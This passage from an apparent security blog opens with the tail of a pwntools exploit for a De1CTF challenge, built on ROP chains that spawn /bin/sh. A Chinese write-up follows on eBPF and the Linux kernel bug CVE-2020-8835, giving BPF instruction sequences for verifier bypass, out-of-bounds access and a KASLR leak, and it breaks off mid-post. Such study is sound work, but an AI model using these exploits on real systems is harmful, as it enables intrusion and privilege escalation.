edit(p, <span class="number">6</span>, payload)</span><br><span class="line">    delete(p, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 64 idx 1 /// 32 idx 6</span></span><br><span class="line">    </span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x602050</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x602818</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x602200</span>) + p64(<span class="number">0x1000</span>)[:<span class="number">5</span>]</span><br><span class="line">    edit(p, <span class="number">1</span>, payload)   <span class="comment">#0x602058</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload = p32(<span class="number">0xf8</span>) + p32(<span class="number">0x804a060</span>) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x804a060</span>) + p32(<span class="number">0x1000</span>)[:<span class="number">3</span>]</span><br><span class="line">    edit(p, <span class="number">6</span>, payload)</span><br><span class="line">    payload = p32(elf32.got[<span class="string">&#x27;atoi&#x27;</span>]) + p32(<span class="number">0x20</span>) + p32(<span class="number">0x804a200</span>) + p32(<span class="number">0x1000</span>) + p32(<span class="number">0x804a7fc</span>) + p32(<span class="number">0x1000</span>) + p32(<span class="number">0x0804a018</span>) + p32(<span class="number">4</span>)</span><br><span class="line">    edit(p, <span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">3</span>, p32(<span class="number">0x080489fb</span>)) <span class="comment"># test</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">############### 64 bit ROP</span></span><br><span class="line">    <span class="comment"># call read to change write@got to syscall</span></span><br><span class="line">    ROP64 = p64(<span class="number">0x400c2a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf64.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">1</span>) + p64(elf64.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(<span class="number">0x400C10</span>)</span><br><span class="line">    ROP64 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x602700</span>) + p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">    ROP64 += p64(<span class="number">0x400c2a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf64.got[<span class="string">&#x27;read&#x27;</span>]) + p64(<span class="number">1</span>) + p64(<span class="number">0x602200</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400C10</span>)</span><br><span class="line">    ROP64 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">59</span>+<span class="number">0x30</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;/bin/sh\x00&#x27;</span><span class="comment"># 0x602900 binsh</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set rax</span></span><br><span class="line">    ROP64 += p64(<span class="number">0x400B2B</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># call syscall</span></span><br><span class="line">    ROP64 += p64(<span class="number">0x400c2a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf64.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x602900</span>) + p64(<span class="number">0x400C10</span>)</span><br><span class="line">    ROP64 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x602700</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line">    </span><br><span class="line">    edit(p, <span class="number">1</span>, ROP64)</span><br><span class="line"></span><br><span class="line">    <span class="comment">############### 64 bit ROP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">############### 32 bit ROP</span></span><br><span class="line">    read_plt = <span class="number">0x8048460</span></span><br><span class="line">    write_got = <span class="number">0x804A02C</span></span><br><span class="line">    write_plt = <span class="number">0x80484D0</span></span><br><span class="line">    p_4reg_32 = <span class="number">0x080489f8</span></span><br><span class="line">    p_ebx_32 = <span class="number">0x08048439</span></span><br><span class="line">    bin_sh_addr = <span class="number">0x804a2e8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># call read to change write@got to syscall</span></span><br><span class="line">    ROP32 = p32(read_plt)+p32(p_4reg_32)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a300</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    ROP32 += p32(read_plt)+p32(p_4reg_32)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    ROP32 += p32(read_plt)+p32(p_4reg_32)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set eax, edx</span></span><br><span class="line">    ROP32 += p32(<span class="number">0x080489f9</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xb</span>+<span class="number">0x2c</span>)</span><br><span class="line">    ROP32 += p32(<span class="number">0x8048907</span>)</span><br><span class="line">    ROP32 += p32(<span class="number">0</span>) * <span class="number">9</span></span><br><span class="line">    ROP32 += p32(<span class="number">0x8048588</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set ebx and call syscall</span></span><br><span class="line">    ROP32 += p32(p_ebx_32)+p32(bin_sh_addr)+p32(write_plt)</span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">2</span>, ROP32)</span><br><span class="line"></span><br><span class="line">    <span class="comment">############### 32 bit ROP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger ROP</span></span><br><span class="line">    payload = p32(<span class="number">0x80489ee</span>) + p32(<span class="number">0</span>) + p64(<span class="number">0x400c2f</span>)[:<span class="number">6</span>]</span><br><span class="line">    edit(p, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    payload = p32(<span class="number">0x602800</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x804a800</span><span class="number">-8</span>) + p32(<span class="number">0x8048568</span>) + p64(<span class="number">0x400c2d</span>) + p64(<span class="number">0x602800</span>)[:<span class="number">6</span>]</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">##### first read to change write@got in 64bit</span></span><br><span class="line">    p.send(<span class="string">&#x27;\x7b&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">##### second read to change write@got in 32bit</span></span><br><span class="line">    p.send(chr(count))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        pwn(<span class="number">108</span>) <span class="comment"># Bruteforce 32 bit libc</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>de1ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>eBPF &amp; CVE-2020-8835</title>
    <url>/2020/11/09/eBPF%20&amp;%20CVE-2020-8835/</url>
    <content><![CDATA[<p>Hello BPF !</p>
<a id="more"></a>

<h2 id="0x00-BPF简介"><a href="#0x00-BPF简介" class="headerlink" title="0x00 BPF简介"></a>0x00 BPF简介</h2><p>BPF的全称是Berkeley Packet Filter，是一个用于过滤(filter)网络报文(packet)的架构。BPF是在1997年首次被引入Linux，当时的内核版本为2.1.75。准确的说，Linux内核中的报文过滤机制其实是有自己的名字的：Linux Socket Filter，简称 LSF。但也许是因为 BPF 名声太大了，连内核文档都直言LSF其实就是BPF。</p>
<p>LSF和BPF除了名字上的差异以外，还是有些不同的，首当其冲的分歧就是接口：传统的 BSD 开启 BPF的方式主要是靠打开(open)/dev/bpfX设备，之后利用 ioctl 来进行控制；而Linux则选择了利用套接字选项(sockopt)SO_ATTACH_FILTER/SO_DETACH_FILTER来执行系统调用。</p>
<p>由于主要是和过滤报文打交道，内核中(before 3.18)的 BPF 的绝大部分实现都被放在了net/core/filter.c下。</p>
<h2 id="0x01-extended-BPF"><a href="#0x01-extended-BPF" class="headerlink" title="0x01 extended BPF"></a>0x01 extended BPF</h2><h3 id="1-1-eBPF简介"><a href="#1-1-eBPF简介" class="headerlink" title="1.1 eBPF简介"></a>1.1 eBPF简介</h3><p>自3.15版本内核，一个BPF的全新设计开始逐渐进入人们的视野，并最终(3.17)被添置到了kernel/bpf下，并最终被命名为extended BPF(eBPF)。为了后向兼容，传统的BPF仍被保留了下来，并被重命名为 classical BPF(cBPF)。</p>
<p>eBPF 带来的改变可谓是革命性的：一方面，它已经为内核追踪(Kernel Tracing)、应用性能调优/监控、流控(Traffic Control)等领域带来了变革；另一方面，在接口的设计以及易用性上，eBPF也有了较大的改进。</p>
<p>所有BPF功能都可以通过BPF syscall访问，该调用支持各种命令。在BPF的手册中，指出在当前实现中，所有bpf()命令都要求调用者具有CAP_SYS_ADMIN功能。但从Linux 4.4开始，任何用户都可以通过将eBPF程序附加到其拥有的套接字，来实现对其的加载和运行。</p>
<h3 id="1-2-eBPF程序"><a href="#1-2-eBPF程序" class="headerlink" title="1.2 eBPF程序"></a>1.2 eBPF程序</h3><p>eBPF使用的指令集有以下寄存器，分别对应硬件CPU的寄存器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R0 - rax ; R1 - rdi ; R2 - rsi ; R3 - rdx ; R4 - rcx</span><br><span class="line">R5 - r8  ; R6 - rbx ; R7 - r13 ; R8 - r14 ; R9 - r15</span><br><span class="line">R10 - rbp;</span><br></pre></td></tr></table></figure>

<p>每条指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;       <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;  <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;  <span class="comment">/* source register */</span></span><br><span class="line">    __s16   off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32   imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>eBPF：</p>
<ol>
<li>为RISC指令系统</li>
<li>虚拟的寄存器对应于物理CPU的寄存器，且功能类似，如r0用于返回值</li>
</ol>
<h4 id="BPF的加载过程"><a href="#BPF的加载过程" class="headerlink" title="BPF的加载过程"></a>BPF的加载过程</h4><ol>
<li>用户程序调用*syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))*申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。</li>
<li>用户程序调用<em>syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))<em>来将我们写的BPF代码加载进内核，attr结构体中包含了指令数量、指令首地址指针、日志级别等属性。</em></em>在加载之前会利用虚拟执行的方式来做安全性校验，这个校验包括对指定语法的检查、指令数量的检查、指令中的指针和立即数的范围及读写权限检查，禁止将内核中的地址暴露给用户空间，禁止对BPF程序stack之外的内核地址读写。**安全校验通过后，程序被成功加载至内核，后续真正执行时，不再重复做检查。</li>
<li>用户程序通过调用*setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd))*将我们写的BPF程序绑定到指定的socket上。Progfd为上一步骤的返回值。</li>
<li>用户程序通过操作上一步骤中的socket来触发BPF真正执行。</li>
</ol>
<h2 id="0x02-CVE-2020-8835"><a href="#0x02-CVE-2020-8835" class="headerlink" title="0x02 CVE-2020-8835"></a>0x02 CVE-2020-8835</h2><h3 id="2-1-漏洞概述"><a href="#2-1-漏洞概述" class="headerlink" title="2.1 漏洞概述"></a>2.1 漏洞概述</h3><p>eBPF有安全检查机制，会对输入的eBPF程序进行检测，然而CVE-2020-8835发现，其检查机制存在漏洞，使得攻击者可以绕过特定的检查并以此构造恶意攻击载荷进行提权。</p>
<h3 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h3><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ol>
<li>寄存器A从未知内存区域读取值，verifier认为A是不确定数（在实际中可以指定）</li>
<li>设置A的umin为1，umax为2^32+1</li>
<li>执行JMP32（如JNE 5, 1），执行完毕后，A被认为就是1（但其实可以为2）</li>
<li>A（被认为是1）执行&amp;2后&gt;&gt;1，在verifier中执行完后A变为0，实际中若是2，执行完后A变为1</li>
<li>后续使用一个超过offset limit乘A，verifier认为是0，但在实际中可造成溢出</li>
</ol>
<h4 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h4><p>漏洞函数在<a href="https://github.com/torvalds/linux/commit/581738a681b6faae5725c2555439189ca81c0f1f">Linux commit 581738a681b6</a>中引入：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __reg_bound_offset32(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	u64 mask = <span class="number">0xffffFFFF</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">range</span> = <span class="title">tnum_range</span>(<span class="title">reg</span>-&gt;<span class="title">umin_value</span> &amp; <span class="title">mask</span>,</span></span><br><span class="line"><span class="class">				       <span class="title">reg</span>-&gt;<span class="title">umax_value</span> &amp; <span class="title">mask</span>);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">lo32</span> = <span class="title">tnum_cast</span>(<span class="title">reg</span>-&gt;<span class="title">var_off</span>, 4);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">hi32</span> = <span class="title">tnum_lshift</span>(<span class="title">tnum_rshift</span>(<span class="title">reg</span>-&gt;<span class="title">var_off</span>, 32), 32);</span></span><br><span class="line"></span><br><span class="line">	reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞发生在eBPF的<code>verifier</code>阶段，在这个阶段，内核会对通过<em>bpf</em>系统调用载入的eBPF程序进行模拟运行来检查合法性，以保证安全性。模拟运行期间使用<strong>bpf_reg_state</strong>来保存寄存器信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> &#123;</span></span><br><span class="line">    <span class="keyword">enum</span> bpf_reg_type type;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        u16 range;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">        u32 btf_id;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> raw;</span><br><span class="line">    &#125;;</span><br><span class="line">    s32 off;</span><br><span class="line">    u32 id;</span><br><span class="line">    u32 ref_obj_id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span> <span class="comment">// &lt;-------------------</span></span><br><span class="line">    s64 smin_value; <span class="comment">//有符号时可能的最小值</span></span><br><span class="line">    s64 smax_value; <span class="comment">//有符号时可能的最大值</span></span><br><span class="line">    u64 umin_value; <span class="comment">//无符号时可能的最小值</span></span><br><span class="line">    u64 umax_value; <span class="comment">//无符号时可能的最小值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">    u32 frameno;</span><br><span class="line">    s32 subreg_def;</span><br><span class="line">    <span class="keyword">enum</span> bpf_reg_liveness live;</span><br><span class="line">    <span class="keyword">bool</span> precise;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> &#123;</span></span><br><span class="line">    u64 value;</span><br><span class="line">    u64 mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>var_off</strong>是<strong>struct tmun</strong>类型，<em>value</em>的某个bit为1时，表示这个寄存器对应的bit确定为1；<em>mask</em>某个bit为1时，表示这个寄存器对应的bit是未知的，可能为1也可能为0。</p>
<p>分析如下跳转指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_JMP_IMM(BPF_JGE, BPF_REG_5, 8, 3)</span><br></pre></td></tr></table></figure>

<p>由这两行代码进行处理，<code>false_reg</code>和<code>true_reg</code>分别代表两个分支的状态，是**__reg_bound_offset32()**的64位版本：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__reg_bound_offset(false_reg);</span><br><span class="line">__reg_bound_offset(true_reg);</span><br></pre></td></tr></table></figure>

<p>当<code>r5 &gt;= 8</code>时，会跳转到<code>pc + 3</code>的地方执行（true分支），那在false分支上，<code>r5</code>肯定小于8。</p>
<p><strong>__reg_bound_offset32()**在使用</strong>BPF_JMP32<strong>时调用，</strong>BPF_JMP<strong>是64bit的比较，</strong>BPF_JMP32**是比较低32bit：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __reg_bound_offset32(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	u64 mask = <span class="number">0xffffFFFF</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">range</span> = <span class="title">tnum_range</span>(<span class="title">reg</span>-&gt;<span class="title">umin_value</span> &amp; <span class="title">mask</span>,</span></span><br><span class="line"><span class="class">				       <span class="title">reg</span>-&gt;<span class="title">umax_value</span> &amp; <span class="title">mask</span>);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">lo32</span> = <span class="title">tnum_cast</span>(<span class="title">reg</span>-&gt;<span class="title">var_off</span>, 4);</span> <span class="comment">// 取低32bit</span></span><br><span class="line">  <span class="comment">// 取高32bit，低32bit为0</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">hi32</span> = <span class="title">tnum_lshift</span>(<span class="title">tnum_rshift</span>(<span class="title">reg</span>-&gt;<span class="title">var_off</span>, 32), 32);</span></span><br><span class="line">	reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function">struct tnum <span class="title">tnum_range</span><span class="params">(u64 min, u64 max)</span>                            </span></span><br><span class="line"><span class="function"> </span>&#123;                                                                   </span><br><span class="line">     u64 chi = min ^ max, delta;</span><br><span class="line">     <span class="comment">// 从右往左第一个为1的bit的位置</span></span><br><span class="line">     <span class="comment">// fls64(0100)  ==  3</span></span><br><span class="line">     u8 bits = fls64(chi);                                          </span><br><span class="line"></span><br><span class="line">     <span class="comment">/* special case, needed because 1ULL &lt;&lt; 64 is undefined */</span>      </span><br><span class="line">     <span class="keyword">if</span> (bits &gt; <span class="number">63</span>)                                                  </span><br><span class="line">         <span class="keyword">return</span> tnum_unknown;                                        </span><br><span class="line">     <span class="comment">/* e.g. if chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.           </span></span><br><span class="line"><span class="comment">     |* if chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 0, so we return   </span></span><br><span class="line"><span class="comment">     |*  constant min (since min == max).                            </span></span><br><span class="line"><span class="comment">     |*/</span>                                                             </span><br><span class="line">     delta = (<span class="number">1U</span>LL &lt;&lt; bits) - <span class="number">1</span>;                                     </span><br><span class="line">     <span class="keyword">return</span> TNUM(min &amp; ~delta, delta);                               </span><br><span class="line"> &#125;   </span><br><span class="line"></span><br><span class="line"><span class="function">struct tnum <span class="title">tnum_intersect</span><span class="params">(struct tnum a, struct tnum b)</span>     </span></span><br><span class="line"><span class="function"></span>&#123;                                                            </span><br><span class="line">    u64 v, mu;                                               </span><br><span class="line"></span><br><span class="line">    v = a.value | b.value;                                   </span><br><span class="line">    mu = a.mask &amp; b.mask;                                    </span><br><span class="line">    <span class="keyword">return</span> TNUM(v &amp; ~mu, mu);                                </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p><strong>tnum__range()*<em>传入的参数只取低32bit，并创建一个新的</em>TNUM*。漏洞发生的原因是</strong>tnum_range()**的实现方式有问题，计算<code>range</code> 的时候直接取低32bit，因为原本的<code>umin_value</code> 和 <code>umax_value</code> 都是64bit的， 假如计算之前<code>umin_value == 1</code> 、 <code>umax_value == 1 0000 0001</code> ，取低32bit之后他们都会等于1，这样range计算完之后<code>TNUM(min &amp; ~delta, delta);</code> ，<code>min = 1</code> ， <code>delta = 0</code>。</p>
<p>接着进入**tnum_intersect()**，假设<code>a.value == 0</code>，计算后<code>v == 1</code>，<code>mu == 0</code>，得到最后的<code>var_off == 1</code>，即不管寄存器真实值如何，在<code>verifier</code>过程中都会被当作1。</p>
<h3 id="2-3-eBPF部分函数功能"><a href="#2-3-eBPF部分函数功能" class="headerlink" title="2.3 eBPF部分函数功能"></a>2.3 eBPF部分函数功能</h3><p>分析序列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             &#x2F;* r9 &#x3D; (u32)0xFFFFFFFF   *&#x2F;</span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   &#x2F;* if (r9 &#x3D;&#x3D; -1) &#123;        *&#x2F;</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, 0),                      &#x2F;*   exit(0);             *&#x2F;</span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>比较语句BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)，<em>do_check</em>在校验条件类跳转指令的时候，会判断条件是否成立，如果是非确定性跳转，说明接下来的2个分支都有可能执行，这时<em>do_check</em>会把下一步需要跳转到的指令编号（分支B）放到一个临时栈备用，这样当前指令顺序（分支A）过程中遇到EXIT指令的时候，会从临时栈中取出之前保存的下一条指令继续校验。如果跳转指令恒成立，就不会向临时栈中压入分支。</p>
<p>接下来看BPF_EXIT_INSN()，前段提到在校验EXIT指令时，会从临时栈中尝试读取指令，如果临时栈有指令，那就说明还有其他可能执行到的分支，需要继续校验，如果取不到值，则这条EXIT指令确实是BPF程序的最后一条指令，然后break跳出<em>do_check</em>的校验循环。</p>
<p>在示例代码中，由于条件恒成立，因此break出<em>do_check</em>，不再继续执行校验循环。</p>
<h3 id="2-4-exploit分析"><a href="#2-4-exploit分析" class="headerlink" title="2.4 exploit分析"></a>2.4 exploit分析</h3><h4 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h4><p>首先创建一个array map，在eBPF指令中，让<code>r9 = map[1]; r6 = r9</code>，<code>r6</code>是用来调试漏洞的寄存器，通过这种加载方式，<code>verifier</code>就不知道<code>r6</code>的切确值了，这时候的<code>var_off-&gt;value == 0</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_LDX_MEM(BPF_DW, 6, 9, 0)</span><br></pre></td></tr></table></figure>

<p>可在map_create的时候下断点以获得map的地址值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span>        </span></span><br><span class="line"><span class="function"></span>&#123;                                                                      </span><br><span class="line"><span class="comment">//....                                    </span></span><br><span class="line">    <span class="built_in">map</span> = ops-&gt;map_alloc(attr);  <span class="comment">//&lt;====                                      </span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))     <span class="comment">// 125                                              </span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>;                                                    </span><br><span class="line"><span class="comment">//...                                           </span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>;                                                        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在判断语句处，由于判断条件的设置，<code>umin_value</code>会被设置成1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_JMP_IMM(BPF_JGE, 6, 1, 1) </span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p><code>r8 = 0x100000001</code>，再次通过跳转指令使得<code>umax_value</code>为0x100000001：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_MOV64_IMM(8, 0x1)</span><br><span class="line">BPF_ALU64_IMM(BPF_LSH, 8, 32)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, 8, 1)</span><br><span class="line">&#x2F;* BPF_JLE  tnum  umax 0x100000001 *&#x2F;</span><br><span class="line">BPF_JMP_REG(BPF_JLE, 6, 8, 1)</span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>通过<em>JMP32</em>来触发漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_JMP32_IMM(BPF_JNE, 6, 5, 1)</span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>在**__reg_bound_offset32()**下个断点，参考文章里是在<code>kernel/bpf/verifier.c:1038</code>， <code>false_reg</code> 函数执行前后值如下：</p>
<h4 id="地址泄漏"><a href="#地址泄漏" class="headerlink" title="地址泄漏"></a>地址泄漏</h4><p>令一开始<code>r6 = 2</code>，<code>verifier</code>过程到这里，<code>r6</code>会被认为是1，<code>( 1 &amp; 2 ) &gt;&gt; 1 == 0</code>，但是实际运行的时候 <code>( 2 &amp; 2 ) &gt;&gt; 1 == 1</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_AND, 6, 2)</span><br><span class="line">BPF_ALU64_IMM(BPF_RSH, 6, 1)</span><br></pre></td></tr></table></figure>

<p>接下来让<code>r6 = r6 * 0x110</code> ，这样 <code>verifier</code>过程仍然认为它是0，但是运行过程的实际值确实 <code>0x110</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_MUL, 6, 0x110)</span><br></pre></td></tr></table></figure>

<p>我们获取一个map，叫它<code>expmap</code>吧， <code>r7 = expmap[0]</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_MOV64_REG(7, 0)</span><br></pre></td></tr></table></figure>

<p>然后<code>r7 = r7 - r6</code>，因为<code>r7</code>是指针类型， <code>verifier</code>会根据map的size来检查边界，但是<code>verifier</code>的时候认为<code>r6 == 0</code>，<code>r7 - 0 == r7</code>，所以可以通过检查，但是运行的时候我们可以让<code>r7 = r7 - 0x110</code>，然后<code>BPF_LDX_MEM(BPF_DW, 8, 7, 0)</code>就可以做越界读写了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_REG(BPF_SUB, 7, 6)</span><br></pre></td></tr></table></figure>

<p>eBPF使用<em>bpf_map</em>来保存map信息，也就是<strong>map_create</strong>得到的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct bpf_map &#123;</span><br><span class="line">    const struct bpf_map_ops *ops;</span><br><span class="line">    struct bpf_map *inner_map_meta;</span><br><span class="line">    void *security;</span><br><span class="line">    enum bpf_map_type map_type;</span><br><span class="line">    &#x2F;&#x2F;....</span><br><span class="line">    u64 writecnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>map_lookup_elem</code>的时候， 使用的是<code>bpf_array</code>，它的开头是<code>bpf_map</code>，然后<code>value</code>就是map的每一个项的数组，也就是说<code>bpf_map</code>刚好在<code>r7</code>的低地址处（<code>r7</code>是第一个value），这里查看内存可以知道<code>map</code>在<code>r7 - 0x110</code>的地方：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct bpf_array &#123;</span><br><span class="line">    struct bpf_map map;</span><br><span class="line">    u32 elem_size;</span><br><span class="line">    u32 index_mask;</span><br><span class="line">    struct bpf_array_aux *aux;</span><br><span class="line">    union &#123;</span><br><span class="line">        char value[];&#x2F;&#x2F;&lt;--- elem</span><br><span class="line">        void *ptrs[];</span><br><span class="line">        void *pptrs[];</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是我们就可以读写<code>bpf_map</code>来做后续的利用。</p>
<p>首先是地址泄漏，<code>bpf_map</code>有一个<em>const struct bpf_map_ops ops</em>字段，当我们创建的<code>map</code>是<strong>BPF_MAP_TYPE_ARRAY</strong>的时候保存的是<em>array_map_ops</em>，这是一个全局变量，保存在<strong>rdata</strong>段，通过它可以计算KASLR的偏移。运行的时候可以在下面的<code>wait_list</code>处泄漏出<code>map</code>的地址：</p>
